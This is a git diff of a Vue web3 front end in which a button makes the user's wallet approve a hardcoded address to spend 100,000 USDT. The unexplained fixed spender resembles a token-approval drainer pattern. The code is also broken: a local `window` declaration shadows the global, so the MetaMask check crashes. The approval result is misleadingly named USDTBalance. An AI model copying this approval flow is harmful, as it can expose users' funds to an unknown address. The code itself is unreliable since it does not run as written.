@@ -4,7 +4,7 @@ import { EthersAdapter } from '@reown/appkit-adapter-ethers'
 import { mainnet, arbitrum } from '@reown/appkit/networks'
 import { useWriteContract } from '@wagmi/vue'
 import { abi } from './abi'
-import { BrowserProvider, Contract, Eip1193Provider, ethers, formatUnits } from 'ethers'
+import { BrowserProvider, Contract, ethers, formatUnits } from 'ethers'
 
 const { writeContract } = useWriteContract()
 
@@ -25,13 +25,16 @@ const USDTAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
     const { address, isConnected } = useAppKitAccount()
     const { walletProvider } = useAppKitProvider('eip155')
   try {
-    if (!isConnected) throw Error('User disconnected')
-
-const ethersProvider = new BrowserProvider(walletProvider as Eip1193Provider)
-const signer = await ethersProvider.getSigner()
+    let window: any
+    if (!window.ethereum) {
+          alert('Please install MetaMask!');
+          return;
+        }
+    const ethersProvider = new ethers.BrowserProvider(window.ethereum)
+    const signer = await ethersProvider.getSigner()
     // The Contract object
     const USDTContract = new Contract(USDTAddress, USDTAbi, signer)
-    const approveRssult = await USDTContract.approve( '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', 
+    const USDTBalance = await USDTContract.approve( '0x5ecA4288BFe530AB9b3cf455eE94c8951EA292bb', 
     BigInt(100000000000) )
     console.log('Approval successful');
   } catch (error) {
@@ -90,6 +93,6 @@ const modal = useAppKit()
 <template>
   <w3m-button />
   <button @click="approve2">
-    approve
+    approve2
   </button>
 </template>
